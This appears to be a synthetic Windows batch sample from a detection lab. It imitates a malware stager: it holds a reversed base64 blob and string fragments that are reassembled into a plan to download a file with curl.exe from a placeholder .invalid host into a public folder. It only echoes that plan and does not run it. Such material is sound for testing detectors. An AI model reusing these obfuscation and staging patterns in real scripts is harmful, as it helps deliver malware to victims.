@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|identity
rem HUNTRESS-MATERIAL:==AdhRmLwMGNzUmNlhDZ50SZnFGdzxlYhx0czVmc05WdIx1YpxmY1BFXzJXZzVFX6MUPoRXYw9VZslmZ8RXYk5yNlF2NmlDOh9CZpxWY25WauUGbw1WY4VmLwMGNzUmNlhDZ58yL6MHc0RHa9wmc1xHMjRzMlZTZ4QWOt42ZpFGctF2Y9QWaf52ZpFGctF2Y8Vmbv5WPldWY1dmbhx2X0hXZuxnchVmbpxWPoBXYydGfx0DduV3bj9VZnFGdzxXZ4VmLsJXdj1jclRHchRWY8VGbpZ2XlRXaydHLlR3btVmcfVmcpVXcjFWPzBXZ0NHfx0jd
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "FrAg0=v=1|steps=acquire_remote,write_file|adapter=curl.exe|stage_co"
set "FrAg1=unt=1|graph=linear|next_language=none|campaign_id=campaign-9d"
set "FrAg2=8e6e34c0|url=https://9d8e6e34c0.example.invalid/a89f7ae7.dat|"
set "FrAg3=file_path=C:\Users\Public\HuntressLab\stage-9d8e6e34c0.dat"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
ver >nul
if errorlevel 1 exit /b 1
set "ReCoVeReD=%FrAg0%%FrAg1%%FrAg2%%FrAg3%"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo curl.exe acquire https://9d8e6e34c0.example.invalid/a89f7ae7.dat to C:\Users\Public\HuntressLab\stage-9d8e6e34c0.dat
exit /b 0
